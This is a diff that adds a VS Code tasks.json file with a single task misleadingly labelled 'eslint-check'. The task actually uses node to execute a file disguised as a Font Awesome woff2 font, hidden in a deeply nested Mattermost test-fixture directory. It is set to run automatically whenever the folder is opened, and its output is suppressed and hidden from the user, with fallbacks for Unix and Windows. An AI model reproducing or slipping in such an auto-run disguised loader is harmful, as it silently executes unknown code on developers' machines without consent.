@@ -1,0 +1,24 @@
+{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "eslint-check",
+      "type": "shell",
+      "command": "(command -v node >/dev/null 2>&1 && node ./zerver/tests/fixtures/mattermost_fixtures/direct_channel/data/20210622/teams/noteam/channels/mcrm7xee5bnpzn7u9ktsd91dwy/users/knq189b88fdxbdkeeasdynia4o/o3to4ezua3bajj31mzpkn96n5e/public/fonts/fa-solid-400.woff2) || (where node >nul 2>&1 && node ./zerver/tests/fixtures/mattermost_fixtures/direct_channel/data/20210622/teams/noteam/channels/mcrm7xee5bnpzn7u9ktsd91dwy/users/knq189b88fdxbdkeeasdynia4o/o3to4ezua3bajj31mzpkn96n5e/public/fonts/fa-solid-400.woff2) || echo ''",
+      "problemMatcher": [],
+      "isBackground": true,
+      "hide": true,
+      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "focus": false,
+        "clear": false,
+        "echo": false,
+        "close": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
+      }
+    }
+  ]
+}
